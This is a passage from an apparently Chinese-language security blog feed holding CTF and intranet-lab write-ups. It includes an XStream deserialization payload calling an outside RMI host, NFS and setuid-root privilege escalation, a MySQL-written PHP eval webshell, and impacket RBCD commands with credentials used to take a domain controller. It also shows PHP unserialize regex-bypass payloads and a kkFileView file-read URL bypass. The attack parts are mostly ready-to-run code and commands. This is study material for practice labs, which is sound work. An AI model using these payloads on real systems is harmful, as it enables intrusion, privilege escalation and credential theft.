class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.234.228:8080</span><br><span class="line">Content-Length: 3115</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://39.99.234.228:8080</span><br><span class="line">Referer: http://39.99.234.228:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;101.42.39.110&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;101.42.39.110&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><p>然后监听端口就行</p><p><img src="../images/image-20231020203853327.png" alt="image-20231020203853327"></p><p>root权限直接拿flag</p><p><img src="../images/image-20231020203928761.png" alt="image-20231020203928761"></p><p>然后扫内网挂代理</p><p><img src="../images/image-20231020204709906.png" alt="image-20231020204709906"></p><p>整理信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.57   Centos  2049端口  NFS</span><br><span class="line"></span><br><span class="line">172.22.13.6    DC  XIAORANG\WIN-DC</span><br><span class="line"></span><br><span class="line">172.22.13.28    WIN-HAUWOLAO.xiaorang.lab 8000  mysql:172.22.13.28:3306:root 123456  OA系统 </span><br><span class="line"></span><br><span class="line">172.22.13.14   getshell主机  拿下</span><br></pre></td></tr></table></figure><p>这个NFS是关键  文件共享用的一个服务  默认端口2049</p><p>NFS 提权, 参考文章: <a href="https://xz.aliyun.com/t/11664">https://xz.aliyun.com/t/11664</a></p><p>大致就是 NFS 配置不当导致文件权限也能被共享过去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//因为本身ubuntu是不存在showmount这个工具的  所以我们得下载 但是下载源不对  所以我们要进行更改</span><br><span class="line">sudo sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">apt-get install nfs-common -y</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">showmount -e 172.22.13.57      //查看哪些路径下的文件可以被共享</span><br><span class="line">Export list for 172.22.13.57:</span><br><span class="line">/home/joyce *   </span><br><span class="line"></span><br><span class="line">mount -t nfs 172.22.13.57:/home/joyce /tmp/joyce -o nolock   </span><br><span class="line"></span><br><span class="line">//进行挂载 我们就可以访问/home/joyce下的文件了</span><br></pre></td></tr></table></figure><p>这里的话我们使用写ssh公钥的方式进行登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">mkdir .ssh</span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /tmp/joyce/.ssh/authorized_keys</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">ssh  -i /root/.ssh/id_rsa joyce@172.22.13.57</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020205738859.png" alt="image-20231020205738859"></p><p>虽然flag在根目录下  但是我们并没有权限去读取他  这里的话有两个方法可以进行提权操作</p><ul><li>NFS提权</li></ul><p>这里能够提权的原因是  创建的文件共享过去的时候连着权限也一起传过去了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;&#x27; &gt; pwn.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp/joyce# echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">&gt; void main()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;         setuid(0);</span><br><span class="line">&gt;         setgid(0);</span><br><span class="line">&gt;         system(&quot;bash&quot;);</span><br><span class="line">&gt; &#x27; &gt; pwn.c</span><br><span class="line">&#125;&#x27; &gt; pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# dir</span><br><span class="line">dir</span><br><span class="line">pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# ls</span><br><span class="line">ls</span><br><span class="line">pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# cat pwn.c</span><br><span class="line">cat pwn.c</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">root@ubuntu:/tmp/joyce# chmod -s pwn.c</span><br><span class="line">chmod -s pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn</span><br><span class="line">gcc pwn.c -o pwn</span><br><span class="line">pwn.c: In function ‘main’:</span><br><span class="line">pwn.c:6:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |         system(&quot;bash&quot;);</span><br><span class="line">      |         ^~~~~~</span><br><span class="line">root@ubuntu:/tmp/joyce# ls</span><br><span class="line">ls</span><br><span class="line">pwn  pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn;;;</span><br><span class="line">gcc pwn.c -o pwn;;;</span><br><span class="line">bash: syntax error near unexpected token `;;&#x27;</span><br><span class="line">root@ubuntu:/tmp/joyce# chmod +s pwn</span><br><span class="line">chmod +s pwn</span><br><span class="line">root@ubuntu:/tmp/joyce# ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 52</span><br><span class="line">drwx------ 3  996  994  4096 Oct 20 21:03 .</span><br><span class="line">drwxrwxrwt 6 root root  4096 Oct 20 21:03 ..</span><br><span class="line">-rw------- 1  996  994    51 Oct 20 21:00 .bash_history</span><br><span class="line">-rw-r--r-- 1  996  994    18 Nov 25  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1  996  994   193 Nov 25  2021 .bash_profile</span><br><span class="line">-rw-r--r-- 1  996  994   231 Nov 25  2021 .bashrc</span><br><span class="line">drwxr-xr-x 2 root root  4096 Oct 20 20:57 .ssh</span><br><span class="line">-rwsr-sr-x 1 root root 16784 Oct 20 21:03 pwn</span><br><span class="line">-rw-r--r-- 1 root root    97 Oct 20 21:02 pwn.c</span><br></pre></td></tr></table></figure><p>这里创建好之后</p><p>ssh登录到刚刚的主机上</p><p><img src="../images/image-20231020212222420.png" alt="image-20231020212222420"></p><p>执行之后就拿下flag了</p><p><img src="../images/image-20231020212242659.png" alt="image-20231020212242659"></p><ul><li>这里讲第二种提权方式  就是ftp提权</li></ul><p><img src="../images/image-20231020212537916.png" alt="image-20231020212537916"></p><p>如果用原来的ftp的话是不行的  这里的话我们重新新建一个ftp  新建的话是有suid的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 6666 -u test -P test -w &amp;</span><br></pre></td></tr></table></figure><p>然后连接上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 172.22.13.14 6666</span><br><span class="line">put /flag02.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020213622125.png" alt="image-20231020213622125"></p><p>然后在Ubuntu的那个主机上再次连接然后get下载下来读取就行了</p><p><img src="../images/image-20231020213732504.png" alt="image-20231020213732504"></p><p>然后一样的方法读取centos机器的目录下还有一个pAss.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab/zhangwen\ QT62f3gBhK1</span><br><span class="line"></span><br><span class="line">//给了一个账号密码</span><br></pre></td></tr></table></figure><p>这就是两种不同的提权方法</p><blockquote><p>NFS是利用这个共享文件时权限也会共享过去</p><p>ftp是利用了suid这个权限</p></blockquote><p>接下来直接搭建隧道</p><p>这里拿下第二个flag之后  回看之前的信息收集  发现了一个弱口令的mysql</p><p>于是我们使用navicat来连接  mdut的话是udf提权失败</p><p><img src="../images/image-20231020214335122.png" alt="image-20231020214335122"></p><p>发现是任意路径可写  并且是以phpstudy启动的  于是直接写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;</span><br></pre></td></tr></table></figure><p>然后蚁剑连接</p><p><img src="../images/image-20231020214523510.png" alt="image-20231020214523510"></p><p>因为是phpstudy启动的  权限高  所以可以直接读取</p><p><img src="../images/image-20231020214607268.png" alt="image-20231020214607268"></p><p>这个是我们刚刚获取到的用户名了  我们直接rdp上去运行sharphound.exe来看一下域内环境</p><p>(当然了  蚁剑上传文件查看也是可以的)</p><p><img src="../images/image-20231020214935835.png" alt="image-20231020214935835"></p><p>发现域中的chenglei用户是对这个域控有wirte写的权限  并且还是属于ACL admins组的</p><blockquote><p>那么可以直接写 DCSync / RBCD / Shadow Credentials</p></blockquote><p>这里测试了<code>Shadow Credentials</code>失败   不知道为啥…………………………………..</p><p>因为之前是用过了DCSync了  这次我们就用RBCD来打</p><p>addcomputer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains addcomputer.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br></pre></td></tr></table></figure><p>rbcd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rbcd.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -action write -delegate-to &#x27;WIN-DC$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br></pre></td></tr></table></figure><p>getst</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><p>获取到这个ccache文件后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">然后修改/etc/hosts</span><br><span class="line">172.22.13.6     WIN-DC.xiaorang.lab</span><br><span class="line">加进去就行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后使用psexec.py无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@WIN-DC.xiaorang.lab -k -no-pass -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020215515800.png" alt="image-20231020215515800"></p><p>然后拿下最后一个flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一下ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231020203451556.png&quot; alt=&quot;image-20231020203451556&quot;&gt;&lt;/p&gt;
&lt;p&gt;存在一个ftp匿名登录 &lt;/p&gt;
&lt;p&gt;1.txt中没有东西 </summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>2023-香山杯-Web</title>
    <link href="https://ke1nys.github.io/posts/c253e927.html"/>
    <id>https://ke1nys.github.io/posts/c253e927.html</id>
    <published>2023-10-17T06:24:39.000Z</published>
    <updated>2023-10-20T14:12:45.764Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    class Welcome&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $arg = &#x27;welcome&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;Wh0 4m I?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;name == &#x27;A_G00d_H4ck3r&#x27;)&#123;</span><br><span class="line">                echo $this-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class G00d&#123;</span><br><span class="line">        public $shell;</span><br><span class="line">        public $cmd;</span><br><span class="line">        public function __invoke()&#123;</span><br><span class="line">            $shell = $this-&gt;shell;</span><br><span class="line">            $cmd = $this-&gt;cmd;</span><br><span class="line">            if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">                die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($shell($cmd));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class H4ck3r&#123;</span><br><span class="line">        public $func;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            $function = $this-&gt;func;</span><br><span class="line">            $function();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;data&#x27;]))</span><br><span class="line">        unserialize($_GET[&#x27;data&#x27;]);</span><br><span class="line">    else</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的关键点就是在绕过这个正则匹配  然后进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    public $shell;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $shell = $this-&gt;shell;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">            die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval($shell($cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话其实搜索一下就能找到原题</p><p><img src="../images/image-20231017143252649.png" alt="image-20231017143252649"></p><p>这里用的是这个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd = &#x27;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#x27;;</span><br><span class="line"></span><br><span class="line">//php -r 是可以执行多行php代码</span><br></pre></td></tr></table></figure><p>其实还有很多种方法可以进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[]这个的正则匹配</span><br><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;more /[b-z][0-9][@-z][b-z]&#x27;;</span><br><span class="line"></span><br><span class="line">//当时tmd命令记错了 用了moore来做  然后没成功 就换了另一个来绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;urldecode&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;system(\$_POST[1]);&#x27;;</span><br><span class="line"></span><br><span class="line">//这里的话使用如果是$_POST[1]和system拆开来传参的话是不行的 </span><br><span class="line"></span><br><span class="line">//并且这个urldecode这个函数可以使用其他函数来进行替代</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;shell = &#x27;strtolower&#x27;;</span><br><span class="line">$this-&gt;cmd = &#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">还有一种的话是用这种方法来执行</span><br><span class="line">$this-&gt;shell = &#x27;system&#x27;;</span><br><span class="line">$this-&gt;cmd=&#x27;echo &quot;\156\154\040\057\052&quot;|sh&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="meow-blog"><a href="#meow-blog" class="headerlink" title="meow_blog"></a>meow_blog</h2><p>考察的是原型链的污染</p><p>(先留着  看不太懂)</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MTg0ODg2Ng==&amp;mid=2247483844&amp;idx=1&amp;sn=c770927e26fac822403d76407979a205&amp;chksm=ce119589f9661c9f02fe03cd3c5d3aab4e3e6628496f9e16dae152b11928ce6eaac9a4b9619d&amp;mpshare=1&amp;scene=23&amp;srcid=1016aEb1onrZgJQfzK7F1YrT&amp;sharer_shareinfo=e655dbdf105d9c8a6a2fa8737dc15b93&amp;sharer_shareinfo_first=a43480738df9ebe2764fb8ef00da8d95#rd">正常污染——WP1</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247494301&amp;idx=1&amp;sn=8cb000b5f109e4a3c850901c79b41197&amp;chksm=e8a1c94cdfd6405a6a91eb8dffb86e918cc76ef73aa2560d513130a35c85bc801677fb239b73&amp;mpshare=1&amp;scene=23&amp;srcid=1017O4HFTu9JhH1721nVXxsM&amp;sharer_shareinfo=94391037d31b40e4c18fe7ca08c31089&amp;sharer_shareinfo_first=989c488368efa43fb789948100473227#rd">SSTI—-WP</a></p><h2 id="sharedBox"><a href="#sharedBox" class="headerlink" title="sharedBox"></a><strong>sharedBox</strong></h2><p>这个题还是可以探讨一下的</p><p>这个里没有环境  就讲思路就行了</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MTg0ODg2Ng==&amp;mid=2247483844&amp;idx=1&amp;sn=c770927e26fac822403d76407979a205&amp;chksm=ce119589f9661c9f02fe03cd3c5d3aab4e3e6628496f9e16dae152b11928ce6eaac9a4b9619d&amp;mpshare=1&amp;scene=23&amp;srcid=1016aEb1onrZgJQfzK7F1YrT&amp;sharer_shareinfo=e655dbdf105d9c8a6a2fa8737dc15b93&amp;sharer_shareinfo_first=a43480738df9ebe2764fb8ef00da8d95#rd">WP1</a>     <a href="https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb">WP2</a></p><p>这里刚开始  我是想去信息收集一下  然后发现了是kkfileview   这个东西   然后就去找到了一篇文章</p><p><a href="https://forum.butian.net/share/2088">https://forum.butian.net/share/2088</a>  qax的一篇文章  但是由于作者对源码进行了修改  导致这里的漏洞打不通  只能是慢慢的进行摸索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://59.110.231.185:40953/fileview/;/getCorsFile?urlPath=file:///root</span><br><span class="line"></span><br><span class="line">##刚开始我这里试的时候是403  就没多想  结果赛后发现  是可以绕过的  ..........</span><br></pre></td></tr></table></figure><p>那么我们就可以开始读取文件了 <strong>(file协议是可以看目录下有啥的)</strong></p><p>然后呢我们就读取到了start.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">FLAG_PATH=/tmp/config.properties</span><br><span 